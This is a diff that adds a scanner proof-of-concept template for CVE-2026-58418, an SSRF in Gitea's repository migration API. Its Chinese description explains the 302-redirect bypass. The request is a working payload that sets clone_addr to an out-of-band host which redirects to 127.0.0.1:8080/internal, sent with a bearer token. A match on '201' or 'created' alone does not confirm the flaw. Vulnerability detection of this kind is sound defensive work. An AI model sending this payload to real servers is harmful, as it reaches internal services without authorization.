@@ -1,0 +1,37 @@
+[info]
+author = "AVE"
+description = "检测Gitea仓库迁移功能中HTTP重定向绕过SSRF漏洞。攻击者控制的外部服务器返回302重定向到内网地址时，Gitea跟随重定向不进行二次验证，导致可访问内部服务。"
+id = "POC-AVE-2026-0656"
+name = "CVE-2026-58418 PoC"
+severity = "medium"
+tags = ["cve-2026-58418"]
+vuln_id = [
+    "CVE-2026-58418",
+    "GHSA-rqhx-647v-wx32",
+    "AVE-2026-0656",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/v1/repos/migrate"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"clone_addr":"http://{{interactsh-url}}/redirect?to=http://127.0.0.1:8080/internal","repo_name":"poc-ssrf-{{randstr}}","uid":1,"service":"git","auth_username":"","auth_password":""}'
+type = "json"
+
+[poc.requests.headers]
+Authorization = "Bearer {{token}}"
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "201",
+    "created",
+]
